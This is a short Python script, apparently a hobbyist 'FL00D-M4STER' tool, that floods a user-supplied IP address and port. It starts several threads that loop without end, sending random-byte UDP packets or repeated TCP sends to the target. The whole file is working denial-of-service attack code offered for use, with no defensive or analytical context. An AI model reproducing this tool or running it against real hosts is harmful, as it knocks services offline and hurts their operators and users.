#!/usr/bin/env python3
#Code by cosm1c & CR4ZY
import argparse
import random
import socket
import threading
import os
import time

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str)
ap.add_argument("-p", "--port", required=True, type=int)
ap.add_argument("-c", "--choice", type=str, default="Y")
ap.add_argument("-t", "--times", type=int, default=100)
ap.add_argument("-r", "--threads", type=int, default=5)
args = vars(ap.parse_args())

os.system("clear")
os.system("setterm -foreground green")
os.system("figlet FL00D-M4STER")
time.sleep(5)

print
os.system("setterm -foreground white")
ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Enviado!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Enviado!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'Y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()


